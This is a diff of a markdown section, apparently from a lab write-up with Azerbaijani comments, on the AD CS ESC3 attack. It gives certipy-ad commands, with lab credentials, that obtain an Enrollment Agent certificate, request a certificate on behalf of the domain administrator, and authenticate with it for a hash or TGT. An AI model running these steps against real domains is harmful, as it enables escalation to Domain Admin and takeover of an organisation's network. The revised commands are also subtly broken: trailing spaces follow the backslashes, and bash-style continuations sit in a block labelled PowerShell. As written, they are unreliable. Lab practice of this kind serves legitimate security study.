@@ -96,38 +96,33 @@ ldapsearch -x -H ldap://dc.domain.local \
 
 ```powershell
 # Step 1 — Condition 1 şablonundan Enrollment Agent sertifikatı al
-certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -target 192.168.0.150 \
-    -ca 'certificate-WIN-CERTIFICATE-CA' \
-    -template 'VulnESC3-Cond1' \
-    -ldap-scheme ldap
-
-# Output: test.pfx  (enrollment agent sertifikatı)
+certipy-ad req \
+  -u 'test@certificate.local' \
+  -p 'sako2005!' \
+  -dc-ip 192.168.0.150 \
+  -target WIN-CERTIFICATE.certificate.local \
+  -ca 'certificate-WIN-CERTIFICATE-CA' \
+  -template 'VulnESC3-Cond1' \
+  -upn 'test@certificate.local'
 
 # Step 2 — Həmin sertifikatı istifadə edərək Domain Admin adına
-#           Condition 2 şablonundan sertifikat al
-certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -target 192.168.0.150 \
-    -ca 'certificate-WIN-CERTIFICATE-CA' \
-    -template 'VulnESC3-Cond2' \
-    -on-behalf-of 'certificate\administrator' \
-    -pfx test.pfx \
-    -ldap-scheme ldap
-
-# Output: administrator.pfx
-
-# Step 3 — NT Hash al
-certipy-ad auth \
-    -pfx administrator.pfx \
-    -dc-ip 192.168.0.150
+certipy-ad req \ 
+  -u 'test@certificate.local' \
+  -p 'sako2005!' \             
+  -dc-ip 192.168.0.150 \     
+  -target WIN-CERTIFICATE.certificate.local \
+  -ca 'certificate-WIN-CERTIFICATE-CA' \
+  -template 'VulnESC3-Cond2' \
+  -on-behalf-of 'certificate\administrator' \
+  -pfx test.pfx \
+  -upn 'administrator@certificate.local'
 
 # Step 3 (alternativ) — TGT al
 certipy-ad auth \
-    -pfx administrator.pfx \
-    -domain certificate.local \
-    -dc-ip 192.168.0.150
+  -pfx 'administrator.pfx' \
+  -domain 'certificate.local' \
+  -username 'administrator' \
+  -dc-ip 192.168.0.150
 ```
 
 ---
